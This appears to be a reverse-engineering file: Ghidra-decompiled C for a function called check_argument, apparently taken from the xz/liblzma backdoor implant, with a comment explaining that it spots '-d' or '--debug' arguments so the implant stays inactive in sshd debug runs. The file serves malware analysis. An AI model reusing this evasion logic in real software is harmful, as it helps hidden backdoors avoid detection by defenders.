// /home/kali/xzre-ghidra/xzregh/1039C0_check_argument.c
// Function: check_argument @ 0x1039C0
// Calling convention: __stdcall
// Prototype: char * __stdcall check_argument(char arg_first_char, char * arg_name)


/*
 * AutoDoc: Sanity-checks a dash-prefixed argv entry by sliding a two-byte window across it and immediately returning the current
 * pointer when either byte is the lowercase letter `d`. `process_is_sshd` treats that non-null result as grounds to abort,
 * which keeps the implant out of sshd instances started with `-d`, `--debug`, or any argument that embeds a lowercase
 * debug flag. Arguments containing control characters or `=` bail out of the loop without ever tripping the match, so only
 * the specific `-d` style switches are rejected.
 */

#include "xzre_types.h"

char * check_argument(char arg_first_char,char *arg_name)

{
  ushort uVar1;
  ushort uVar2;
  ushort uVar3;
  u16 mirrored_word;
  u16 flag_word;
  
  if (arg_first_char == '-') {
    while( TRUE ) {
      uVar1 = *(ushort *)arg_name;
      uVar3 = uVar1 << 8;
      uVar2 = uVar1 & 0xff00;
      if ((uVar2 == 0x6400) || (uVar3 == 0x6400)) break;
      if ((((uVar1 & 0xdf00) == 0) ||
          (((uVar2 == 0x900 || (uVar2 == 0x3d00)) || ((uVar3 & 0xdf00) == 0)))) ||
         ((uVar3 == 0x3d00 || (uVar3 == 0x900)))) goto LAB_00103a17;
      arg_name = (char *)((long)arg_name + 2);
    }
  }
  else {
LAB_00103a17:
    arg_name = (char *)0x0;
  }
  return arg_name;
}

